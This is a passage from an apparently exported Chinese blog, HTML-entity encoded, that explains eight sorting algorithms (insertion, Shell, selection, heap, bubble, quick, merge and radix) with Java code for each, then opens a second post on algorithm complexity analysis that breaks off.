&#x4E2A;&#x6570;&#x5DF2;&#x7ECF;&#x662F;&#x6392;&#x597D;&#x987A;&#x5E8F;&#x7684;&#xFF0C;&#x73B0;&#x5728;&#x8981;&#x628A;&#x7B2C;n&#x4E2A;&#x6570;&#x63D2;&#x5230;&#x524D;&#x9762;&#x7684;&#x6709;&#x5E8F;&#x6570;&#x4E2D;&#xFF0C;&#x4F7F;&#x5F97;&#x8FD9;n&#x4E2A;&#x6570;&#x4E5F;&#x662F;&#x6392;&#x597D;&#x987A;&#x5E8F;&#x7684;&#x3002;&#x5982;&#x6B64;&#x53CD;&#x590D;&#x5FAA;&#x73AF;&#xFF0C;&#x76F4;&#x5230;&#x5168;&#x90E8;&#x6392;&#x597D;&#x987A;&#x5E8F;&#x3002;&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;123456789101112131415161718 package com.njue; public class insertSort { public insertSort(){ inta[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51}; int temp=0; for(int i=1;i&lt;a.length;i++){ int j=i-1; temp=a[i]; for(;j&gt;=0&amp;&amp;temp&lt;a[j];j--){ a[j+1]=a[j]; //&#x5C06;&#x5927;&#x4E8E;temp&#x7684;&#x503C;&#x6574;&#x4F53;&#x540E;&#x79FB;&#x4E00;&#x4E2A;&#x5355;&#x4F4D; } a[j+1]=temp; } for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } } 2&#x3001;&#x5E0C;&#x5C14;&#x6392;&#x5E8F;&#xFF08;&#x6700;&#x5C0F;&#x589E;&#x91CF;&#x6392;&#x5E8F;&#xFF09;&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x7B97;&#x6CD5;&#x5148;&#x5C06;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x6309;&#x67D0;&#x4E2A;&#x589E;&#x91CF;d&#xFF08;n/2,n&#x4E3A;&#x8981;&#x6392;&#x5E8F;&#x6570;&#x7684;&#x4E2A;&#x6570;&#xFF09;&#x5206;&#x6210;&#x82E5;&#x5E72;&#x7EC4;&#xFF0C;&#x6BCF;&#x7EC4;&#x4E2D;&#x8BB0;&#x5F55;&#x7684;&#x4E0B;&#x6807;&#x76F8;&#x5DEE;d.&#x5BF9;&#x6BCF;&#x7EC4;&#x4E2D;&#x5168;&#x90E8;&#x5143;&#x7D20;&#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x7528;&#x4E00;&#x4E2A;&#x8F83;&#x5C0F;&#x7684;&#x589E;&#x91CF;&#xFF08;d/2&#xFF09;&#x5BF9;&#x5B83;&#x8FDB;&#x884C;&#x5206;&#x7EC4;&#xFF0C;&#x5728;&#x6BCF;&#x7EC4;&#x4E2D;&#x518D;&#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;&#x3002;&#x5F53;&#x589E;&#x91CF;&#x51CF;&#x5230;1&#x65F6;&#xFF0C;&#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x6392;&#x5E8F;&#x540E;&#xFF0C;&#x6392;&#x5E8F;&#x5B8C;&#x6210;&#x3002;&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;12345678910111213141516171819202122232425public class shellSort { public shellSort(){ int a[]={1,54,6,3,78,34,12,45,56,100}; double d1=a.length; int temp=0; while(true){ d1= Math.ceil(d1/2); int d=(int) d1; for(int x=0;x&lt;d;x++){ for(int i=x+d;i&lt;a.length;i+=d){ int j=i-d; temp=a[i]; for(;j&gt;=0&amp;&amp;temp&lt;a[j];j-=d){ a[j+d]=a[j]; } a[j+d]=temp; } } if(d==1) break; } for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } } 3&#x3001;&#x7B80;&#x5355;&#x9009;&#x62E9;&#x6392;&#x5E8F;&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5728;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x4E2D;&#xFF0C;&#x9009;&#x51FA;&#x6700;&#x5C0F;&#x7684;&#x4E00;&#x4E2A;&#x6570;&#x4E0E;&#x7B2C;&#x4E00;&#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x6570;&#x4EA4;&#x6362;&#xFF1B;&#x7136;&#x540E;&#x5728;&#x5269;&#x4E0B;&#x7684;&#x6570;&#x5F53;&#x4E2D;&#x518D;&#x627E;&#x6700;&#x5C0F;&#x7684;&#x4E0E;&#x7B2C;&#x4E8C;&#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x6570;&#x4EA4;&#x6362;&#xFF0C;&#x5982;&#x6B64;&#x5FAA;&#x73AF;&#x5230;&#x5012;&#x6570;&#x7B2C;&#x4E8C;&#x4E2A;&#x6570;&#x548C;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x6570;&#x6BD4;&#x8F83;&#x4E3A;&#x6B62;&#x3002;&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;12345678910111213141516171819202122public class selectSort { public selectSort(){ int a[]={1,54,6,3,78,34,12,45}; int position=0; for(int i=0;i&lt;a.length;i++){ int j=i+1; position=i; int temp=a[i]; for(;j&lt;a.length;j++){ if(a[j]&lt;temp){ temp=a[j]; position=j; } } a[position]=a[i]; a[i]=temp; } for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } } 4&#x3001;&#x5806;&#x6392;&#x5E8F;&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5806;&#x6392;&#x5E8F;&#x662F;&#x4E00;&#x79CD;&#x6811;&#x5F62;&#x9009;&#x62E9;&#x6392;&#x5E8F;&#xFF0C;&#x662F;&#x5BF9;&#x76F4;&#x63A5;&#x9009;&#x62E9;&#x6392;&#x5E8F;&#x7684;&#x6709;&#x6548;&#x6539;&#x8FDB;&#x3002;&#x5806;&#x7684;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A;&#x5177;&#x6709;n&#x4E2A;&#x5143;&#x7D20;&#x7684;&#x5E8F;&#x5217;&#xFF08;h1,h2,&#x2026;,hn),&#x5F53;&#x4E14;&#x4EC5;&#x5F53;&#x6EE1;&#x8DB3;&#xFF08;hi&gt;=h2i,hi&gt;=2i+1&#xFF09;&#x6216;&#xFF08;hi&lt;=h2i,hi&lt;=2i+1&#xFF09; (i=1,2,&#x2026;,n/2)&#x65F6;&#x79F0;&#x4E4B;&#x4E3A;&#x5806;&#x3002;&#x5728;&#x8FD9;&#x91CC;&#x53EA;&#x8BA8;&#x8BBA;&#x6EE1;&#x8DB3;&#x524D;&#x8005;&#x6761;&#x4EF6;&#x7684;&#x5806;&#x3002;&#x7531;&#x5806;&#x7684;&#x5B9A;&#x4E49;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x5806;&#x9876;&#x5143;&#x7D20;&#xFF08;&#x5373;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF09;&#x5FC5;&#x4E3A;&#x6700;&#x5927;&#x9879;&#xFF08;&#x5927;&#x9876;&#x5806;&#xFF09;&#x3002;&#x5B8C;&#x5168;&#x4E8C;&#x53C9;&#x6811;&#x53EF;&#x4EE5;&#x5F88;&#x76F4;&#x89C2;&#x5730;&#x8868;&#x793A;&#x5806;&#x7684;&#x7ED3;&#x6784;&#x3002;&#x5806;&#x9876;&#x4E3A;&#x6839;&#xFF0C;&#x5176;&#x5B83;&#x4E3A;&#x5DE6;&#x5B50;&#x6811;&#x3001;&#x53F3;&#x5B50;&#x6811;&#x3002;&#x521D;&#x59CB;&#x65F6;&#x628A;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x6570;&#x7684;&#x5E8F;&#x5217;&#x770B;&#x4F5C;&#x662F;&#x4E00;&#x68F5;&#x987A;&#x5E8F;&#x5B58;&#x50A8;&#x7684;&#x4E8C;&#x53C9;&#x6811;&#xFF0C;&#x8C03;&#x6574;&#x5B83;&#x4EEC;&#x7684;&#x5B58;&#x50A8;&#x5E8F;&#xFF0C;&#x4F7F;&#x4E4B;&#x6210;&#x4E3A;&#x4E00;&#x4E2A;&#x5806;&#xFF0C;&#x8FD9;&#x65F6;&#x5806;&#x7684;&#x6839;&#x8282;&#x70B9;&#x7684;&#x6570;&#x6700;&#x5927;&#x3002;&#x7136;&#x540E;&#x5C06;&#x6839;&#x8282;&#x70B9;&#x4E0E;&#x5806;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x4EA4;&#x6362;&#x3002;&#x7136;&#x540E;&#x5BF9;&#x524D;&#x9762;(n-1)&#x4E2A;&#x6570;&#x91CD;&#x65B0;&#x8C03;&#x6574;&#x4F7F;&#x4E4B;&#x6210;&#x4E3A;&#x5806;&#x3002;&#x4F9D;&#x6B64;&#x7C7B;&#x63A8;&#xFF0C;&#x76F4;&#x5230;&#x53EA;&#x6709;&#x4E24;&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x5806;&#xFF0C;&#x5E76;&#x5BF9;&#x5B83;&#x4EEC;&#x4F5C;&#x4EA4;&#x6362;&#xFF0C;&#x6700;&#x540E;&#x5F97;&#x5230;&#x6709;n&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#x3002;&#x4ECE;&#x7B97;&#x6CD5;&#x63CF;&#x8FF0;&#x6765;&#x770B;&#xFF0C;&#x5806;&#x6392;&#x5E8F;&#x9700;&#x8981;&#x4E24;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF0C;&#x4E00;&#x662F;&#x5EFA;&#x7ACB;&#x5806;&#xFF0C;&#x4E8C;&#x662F;&#x5806;&#x9876;&#x4E0E;&#x5806;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x4EA4;&#x6362;&#x4F4D;&#x7F6E;&#x3002;&#x6240;&#x4EE5;&#x5806;&#x6392;&#x5E8F;&#x6709;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x7EC4;&#x6210;&#x3002;&#x4E00;&#x662F;&#x5EFA;&#x5806;&#x7684;&#x6E17;&#x900F;&#x51FD;&#x6570;&#xFF0C;&#x4E8C;&#x662F;&#x53CD;&#x590D;&#x8C03;&#x7528;&#x6E17;&#x900F;&#x51FD;&#x6570;&#x5B9E;&#x73B0;&#x6392;&#x5E8F;&#x7684;&#x51FD;&#x6570;&#x3002;&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;&#x521D;&#x59CB;&#x5E8F;&#x5217;&#xFF1A;46,79,56,38,40,84&#x5EFA;&#x5806;&#xFF1A;&#x4EA4;&#x6362;&#xFF0C;&#x4ECE;&#x5806;&#x4E2D;&#x8E22;&#x51FA;&#x6700;&#x5927;&#x6570;&#x4F9D;&#x6B21;&#x7C7B;&#x63A8;&#xFF1A;&#x6700;&#x540E;&#x5806;&#x4E2D;&#x5269;&#x4F59;&#x7684;&#x6700;&#x540E;&#x4E24;&#x4E2A;&#x7ED3;&#x70B9;&#x4EA4;&#x6362;&#xFF0C;&#x8E22;&#x51FA;&#x4E00;&#x4E2A;&#xFF0C;&#x6392;&#x5E8F;&#x5B8C;&#x6210;&#x3002;&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import java.util.Arrays; public class HeapSort { int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51}; public HeapSort(){ heapSort(a); } public void heapSort(int[] a){ System.out.println(&quot;&#x5F00;&#x59CB;&#x6392;&#x5E8F;&quot;); int arrayLength=a.length; //&#x5FAA;&#x73AF;&#x5EFA;&#x5806; for(int i=0;i&lt;arrayLength-1;i++){ //&#x5EFA;&#x5806; buildMaxHeap(a,arrayLength-1-i); //&#x4EA4;&#x6362;&#x5806;&#x9876;&#x548C;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20; swap(a,0,arrayLength-1-i); System.out.println(Arrays.toString(a)); } } private void swap(int[] data, int i, int j) { // TODO Auto-generated method stub int tmp=data[i]; data[i]=data[j]; data[j]=tmp; } //&#x5BF9;data&#x6570;&#x7EC4;&#x4ECE;0&#x5230;lastIndex&#x5EFA;&#x5927;&#x9876;&#x5806; private void buildMaxHeap(int[] data, int lastIndex) { // TODO Auto-generated method stub //&#x4ECE;lastIndex&#x5904;&#x8282;&#x70B9;&#xFF08;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#xFF09;&#x7684;&#x7236;&#x8282;&#x70B9;&#x5F00;&#x59CB; for(int i=(lastIndex-1)/2;i&gt;=0;i--){ //k&#x4FDD;&#x5B58;&#x6B63;&#x5728;&#x5224;&#x65AD;&#x7684;&#x8282;&#x70B9; int k=i; //&#x5982;&#x679C;&#x5F53;&#x524D;k&#x8282;&#x70B9;&#x7684;&#x5B50;&#x8282;&#x70B9;&#x5B58;&#x5728; while(k*2+1&lt;=lastIndex){ //k&#x8282;&#x70B9;&#x7684;&#x5DE6;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x7D22;&#x5F15; int biggerIndex=2*k+1; //&#x5982;&#x679C;biggerIndex&#x5C0F;&#x4E8E;lastIndex&#xFF0C;&#x5373;biggerIndex+1&#x4EE3;&#x8868;&#x7684;k&#x8282;&#x70B9;&#x7684;&#x53F3;&#x5B50;&#x8282;&#x70B9;&#x5B58;&#x5728; if(biggerIndex&lt;lastIndex){ //&#x82E5;&#x679C;&#x53F3;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x503C;&#x8F83;&#x5927; if(data[biggerIndex]&lt;data[biggerIndex+1]){ //biggerIndex&#x603B;&#x662F;&#x8BB0;&#x5F55;&#x8F83;&#x5927;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x7D22;&#x5F15; biggerIndex++; } } //&#x5982;&#x679C;k&#x8282;&#x70B9;&#x7684;&#x503C;&#x5C0F;&#x4E8E;&#x5176;&#x8F83;&#x5927;&#x7684;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x503C; if(data[k]&lt;data[biggerIndex]){ //&#x4EA4;&#x6362;&#x4ED6;&#x4EEC; swap(data,k,biggerIndex); //&#x5C06;biggerIndex&#x8D4B;&#x4E88;k&#xFF0C;&#x5F00;&#x59CB;while&#x5FAA;&#x73AF;&#x7684;&#x4E0B;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#xFF0C;&#x91CD;&#x65B0;&#x4FDD;&#x8BC1;k&#x8282;&#x70B9;&#x7684;&#x503C;&#x5927;&#x4E8E;&#x5176;&#x5DE6;&#x53F3;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x503C; k=biggerIndex; }else{ break; } } } }} 5&#x3001;&#x5192;&#x6CE1;&#x6392;&#x5E8F;&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5728;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x4E2D;&#xFF0C;&#x5BF9;&#x5F53;&#x524D;&#x8FD8;&#x672A;&#x6392;&#x597D;&#x5E8F;&#x7684;&#x8303;&#x56F4;&#x5185;&#x7684;&#x5168;&#x90E8;&#x6570;&#xFF0C;&#x81EA;&#x4E0A;&#x800C;&#x4E0B;&#x5BF9;&#x76F8;&#x90BB;&#x7684;&#x4E24;&#x4E2A;&#x6570;&#x4F9D;&#x6B21;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#x548C;&#x8C03;&#x6574;&#xFF0C;&#x8BA9;&#x8F83;&#x5927;&#x7684;&#x6570;&#x5F80;&#x4E0B;&#x6C89;&#xFF0C;&#x8F83;&#x5C0F;&#x7684;&#x5F80;&#x4E0A;&#x5192;&#x3002;&#x5373;&#xFF1A;&#x6BCF;&#x5F53;&#x4E24;&#x76F8;&#x90BB;&#x7684;&#x6570;&#x6BD4;&#x8F83;&#x540E;&#x53D1;&#x73B0;&#x5B83;&#x4EEC;&#x7684;&#x6392;&#x5E8F;&#x4E0E;&#x6392;&#x5E8F;&#x8981;&#x6C42;&#x76F8;&#x53CD;&#x65F6;&#xFF0C;&#x5C31;&#x5C06;&#x5B83;&#x4EEC;&#x4E92;&#x6362;&#x3002;&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;1234567891011121314151617public class bubbleSort { public bubbleSort(){ int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51}; int temp=0; for(int i=0;i&lt;a.length-1;i++){ for(int j=0;j&lt;a.length-1-i;j++){ if(a[j]&gt;a[j+1]){ temp=a[j]; a[j]=a[j+1]; a[j+1]=temp; } } } for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } } 6&#x3001;&#x5FEB;&#x901F;&#x6392;&#x5E8F;&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x57FA;&#x51C6;&#x5143;&#x7D20;,&#x901A;&#x5E38;&#x9009;&#x62E9;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x6216;&#x8005;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;,&#x901A;&#x8FC7;&#x4E00;&#x8D9F;&#x626B;&#x63CF;&#xFF0C;&#x5C06;&#x5F85;&#x6392;&#x5E8F;&#x5217;&#x5206;&#x6210;&#x4E24;&#x90E8;&#x5206;,&#x4E00;&#x90E8;&#x5206;&#x6BD4;&#x57FA;&#x51C6;&#x5143;&#x7D20;&#x5C0F;,&#x4E00;&#x90E8;&#x5206;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x57FA;&#x51C6;&#x5143;&#x7D20;,&#x6B64;&#x65F6;&#x57FA;&#x51C6;&#x5143;&#x7D20;&#x5728;&#x5176;&#x6392;&#x597D;&#x5E8F;&#x540E;&#x7684;&#x6B63;&#x786E;&#x4F4D;&#x7F6E;,&#x7136;&#x540E;&#x518D;&#x7528;&#x540C;&#x6837;&#x7684;&#x65B9;&#x6CD5;&#x9012;&#x5F52;&#x5730;&#x6392;&#x5E8F;&#x5212;&#x5206;&#x7684;&#x4E24;&#x90E8;&#x5206;&#x3002;&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;123456789101112131415161718192021222324252627282930313233343536public class quickSort { int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51}; public quickSort(){ quick(a); for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } public int getMiddle(int[] list, int low, int high) { int tmp = list[low]; //&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x4F5C;&#x4E3A;&#x4E2D;&#x8F74; while (low &lt; high) { while (low &lt; high &amp;&amp; list[high] &gt;= tmp) { high--; } list[low] = list[high]; //&#x6BD4;&#x4E2D;&#x8F74;&#x5C0F;&#x7684;&#x8BB0;&#x5F55;&#x79FB;&#x5230;&#x4F4E;&#x7AEF; while (low &lt; high &amp;&amp; list[low] &lt;= tmp) { low++; } list[high] = list[low]; //&#x6BD4;&#x4E2D;&#x8F74;&#x5927;&#x7684;&#x8BB0;&#x5F55;&#x79FB;&#x5230;&#x9AD8;&#x7AEF; } list[low] = tmp; //&#x4E2D;&#x8F74;&#x8BB0;&#x5F55;&#x5230;&#x5C3E; return low; //&#x8FD4;&#x56DE;&#x4E2D;&#x8F74;&#x7684;&#x4F4D;&#x7F6E; } public void _quickSort(int[] list, int low, int high) { if (low &lt; high) { int middle = getMiddle(list, low, high); //&#x5C06;list&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x4E00;&#x5206;&#x4E3A;&#x4E8C; _quickSort(list, low, middle - 1); //&#x5BF9;&#x4F4E;&#x5B57;&#x8868;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#x6392;&#x5E8F; _quickSort(list, middle + 1, high); //&#x5BF9;&#x9AD8;&#x5B57;&#x8868;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#x6392;&#x5E8F; } } public void quick(int[] a2) { if (a2.length &gt; 0) { //&#x67E5;&#x770B;&#x6570;&#x7EC4;&#x662F;&#x5426;&#x4E3A;&#x7A7A; _quickSort(a2, 0, a2.length - 1); } } } 7&#x3001;&#x5F52;&#x5E76;&#x6392;&#x5E8F;&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x6392;&#x5E8F;&#xFF1A;&#x5F52;&#x5E76;&#xFF08;Merge&#xFF09;&#x6392;&#x5E8F;&#x6CD5;&#x662F;&#x5C06;&#x4E24;&#x4E2A;&#xFF08;&#x6216;&#x4E24;&#x4E2A;&#x4EE5;&#x4E0A;&#xFF09;&#x6709;&#x5E8F;&#x8868;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x6709;&#x5E8F;&#x8868;&#xFF0C;&#x5373;&#x628A;&#x5F85;&#x6392;&#x5E8F;&#x5E8F;&#x5217;&#x5206;&#x4E3A;&#x82E5;&#x5E72;&#x4E2A;&#x5B50;&#x5E8F;&#x5217;&#xFF0C;&#x6BCF;&#x4E2A;&#x5B50;&#x5E8F;&#x5217;&#x662F;&#x6709;&#x5E8F;&#x7684;&#x3002;&#x7136;&#x540E;&#x518D;&#x628A;&#x6709;&#x5E8F;&#x5B50;&#x5E8F;&#x5217;&#x5408;&#x5E76;&#x4E3A;&#x6574;&#x4F53;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#x3002;&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import java.util.Arrays; public class mergingSort { int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51}; public mergingSort(){ sort(a,0,a.length-1); for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } public void sort(int[] data, int left, int right) { // TODO Auto-generated method stub if(left&lt;right){ //&#x627E;&#x51FA;&#x4E2D;&#x95F4;&#x7D22;&#x5F15; int center=(left+right)/2; //&#x5BF9;&#x5DE6;&#x8FB9;&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x9012;&#x5F52; sort(data,left,center); //&#x5BF9;&#x53F3;&#x8FB9;&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x9012;&#x5F52; sort(data,center+1,right); //&#x5408;&#x5E76; merge(data,left,center,right); } } public void merge(int[] data, int left, int center, int right) { // TODO Auto-generated method stub int [] tmpArr=new int[data.length]; int mid=center+1; //third&#x8BB0;&#x5F55;&#x4E2D;&#x95F4;&#x6570;&#x7EC4;&#x7684;&#x7D22;&#x5F15; int third=left; int tmp=left; while(left&lt;=center&amp;&amp;mid&lt;=right){ //&#x4ECE;&#x4E24;&#x4E2A;&#x6570;&#x7EC4;&#x4E2D;&#x53D6;&#x51FA;&#x6700;&#x5C0F;&#x7684;&#x653E;&#x5165;&#x4E2D;&#x95F4;&#x6570;&#x7EC4; if(data[left]&lt;=data[mid]){ tmpArr[third++]=data[left++]; }else{ tmpArr[third++]=data[mid++]; } } //&#x5269;&#x4F59;&#x90E8;&#x5206;&#x4F9D;&#x6B21;&#x653E;&#x5165;&#x4E2D;&#x95F4;&#x6570;&#x7EC4; while(mid&lt;=right){ tmpArr[third++]=data[mid++]; } while(left&lt;=center){ tmpArr[third++]=data[left++]; } //&#x5C06;&#x4E2D;&#x95F4;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x590D;&#x5236;&#x56DE;&#x539F;&#x6570;&#x7EC4; while(tmp&lt;=right){ data[tmp]=tmpArr[tmp++]; } System.out.println(Arrays.toString(data)); } } 8&#x3001;&#x57FA;&#x6570;&#x6392;&#x5E8F;&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5C06;&#x6240;&#x6709;&#x5F85;&#x6BD4;&#x8F83;&#x6570;&#x503C;&#xFF08;&#x6B63;&#x6574;&#x6570;&#xFF09;&#x7EDF;&#x4E00;&#x4E3A;&#x540C;&#x6837;&#x7684;&#x6570;&#x4F4D;&#x957F;&#x5EA6;&#xFF0C;&#x6570;&#x4F4D;&#x8F83;&#x77ED;&#x7684;&#x6570;&#x524D;&#x9762;&#x8865;&#x96F6;&#x3002;&#x7136;&#x540E;&#xFF0C;&#x4ECE;&#x6700;&#x4F4E;&#x4F4D;&#x5F00;&#x59CB;&#xFF0C;&#x4F9D;&#x6B21;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x6392;&#x5E8F;&#x3002;&#x8FD9;&#x6837;&#x4ECE;&#x6700;&#x4F4E;&#x4F4D;&#x6392;&#x5E8F;&#x4E00;&#x76F4;&#x5230;&#x6700;&#x9AD8;&#x4F4D;&#x6392;&#x5E8F;&#x5B8C;&#x6210;&#x4EE5;&#x540E;,&#x6570;&#x5217;&#x5C31;&#x53D8;&#x6210;&#x4E00;&#x4E2A;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#x3002;&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import java.util.ArrayList; import java.util.List; public class radixSort { int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,101,56,17,18,23,34,15,35,25,53,51}; public radixSort(){ sort(a); for(int i=0;i&lt;a.length;i++) System.out.println(a[i]); } public void sort(int[] array){ //&#x9996;&#x5148;&#x786E;&#x5B9A;&#x6392;&#x5E8F;&#x7684;&#x8D9F;&#x6570;; int max=array[0]; for(int i=1;i&lt;array.length;i++){ if(array[i]&gt;max){ max=array[i]; } } int time=0; //&#x5224;&#x65AD;&#x4F4D;&#x6570;; while(max&gt;0){ max/=10; time++; } //&#x5EFA;&#x7ACB;10&#x4E2A;&#x961F;&#x5217;; List&lt;ArrayList&gt; queue=new ArrayList&lt;ArrayList&gt;(); for(int i=0;i&lt;10;i++){ ArrayList&lt;Integer&gt; queue1=new ArrayList&lt;Integer&gt;(); queue.add(queue1); } //&#x8FDB;&#x884C;time&#x6B21;&#x5206;&#x914D;&#x548C;&#x6536;&#x96C6;; for(int i=0;i&lt;time;i++){ //&#x5206;&#x914D;&#x6570;&#x7EC4;&#x5143;&#x7D20;; for(int j=0;j&lt;array.length;j++){ //&#x5F97;&#x5230;&#x6570;&#x5B57;&#x7684;&#x7B2C;time+1&#x4F4D;&#x6570;; int x=array[j]%(int)Math.pow(10, i+1)/(int)Math.pow(10, i); ArrayList&lt;Integer&gt; queue2=queue.get(x); queue2.add(array[j]); queue.set(x, queue2); } int count=0;//&#x5143;&#x7D20;&#x8BA1;&#x6570;&#x5668;; //&#x6536;&#x96C6;&#x961F;&#x5217;&#x5143;&#x7D20;; for(int k=0;k&lt;10;k++){ while(queue.get(k).size()&gt;0){ ArrayList&lt;Integer&gt; queue3=queue.get(k); array[count]=queue3.get(0); queue3.remove(0); count++; } } } } }","raw":null,"content":null,"categories":[{"name":"算法及理论","slug":"算法及理论","permalink":"http://www.wangxin123.com/categories/算法及理论/"}],"tags":[]},{"title":"算法复杂度分析","slug":"算法复杂度分析","date":"2016-07-27T14:10:00.000Z","updated":"2016-11-20T10:53:34.204Z","comments":true,"path":"2016/07/27/算法复杂度分析/","link":"","permalink":"http://www.wangxin123.com/2016/07/27/算法复杂度分析/","excerpt":"","keywords":null,"text":"&#x524D;&#x8A00;&#x901A;&#x5E38;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x7ED9;&#x5B9A;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x8981;&#x505A;&#x4E24;&#x9879;&#x5206;&#x6790;&#x3002;&#x7B2C;&#x4E00;&#x662F;&#x4ECE;&#x6570;&#x5B66;&#x4E0A;&#x8BC1;&#x660E;&#x7B97;&#x6CD5;&#x7684;&#x6B63;&#x786E;&#x6027;&#xFF0C;&#x8FD9;&#x4E00;&#x6B65;&#x4E3B;&#x8981;&#x7528;&#x5230;&#x5F62;&#x5F0F;&#x5316;&#x8BC1;&#x660E;&#x7684;&#x65B9;&#x6CD5;&#x53CA;&#x76F8;&#x5173;&#x63A8;&#x7406;&#x6A21;&#x5F0F;&#xFF0C;&#x5982;&#x5FAA;&#x73AF;&#x4E0D;&#x53D8;&#x5F0F;&#x3001;&#x6570;&#x5B66;&#x5F52;&#x7EB3;&#x6CD5;&#x7B49;&#x3002;&#x800C;&#x5728;&#x8BC1;&#x660E;&#x7B97;&#x6CD5;&#x662F;&#x6B63;&#x786E;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x7B2C;&#x4E8C;&#x5C31;&#x662F;&#x5206;&#x6790;&#x7B97;&#